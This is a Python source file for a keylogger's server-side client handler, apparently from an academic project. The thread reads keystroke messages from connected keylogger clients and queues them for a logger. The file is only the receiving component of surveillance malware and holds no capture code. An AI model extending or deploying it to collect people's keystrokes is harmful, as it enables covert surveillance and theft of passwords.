'''
File: ClientHandler.py
Author: Christopher A. Wood, caw4567@rit.edu
'''

import socket
import ssl
import threading
import struct
import string
import Queue
import Logger

class ClientHandler(threading.Thread):
	'''
	This is an active thread that is responsible for serving all
	messages that come in from the keylogger. It simply strips
	them out of the socket and forwards them along to the logger
	actor via a message dictionary.
	'''

	def __init__(self, serv):
		'''
		Initialize the client handler with the parent server (TrafficProxy)
		'''
		threading.Thread.__init__(self)
		self.server = serv
		self.clientList = []
		self.running = True

		# Set the properties for this session.
		self.logger = Logger.Logger()
		self.queue = self.logger.getQueue()
		self.logger.start()

	def run(self):
		'''
		The main loop for this cliet handler thread. Simply strip messages
		out of the socket and send them to the logger for processing.
		'''
		while self.running:
			for client in self.clientList:
				message = client.sock.recv(self.server.BUFFSIZE)
				if message != None and message != "":
					print("client message: ", message) # debug 
					self.queue.put(message)
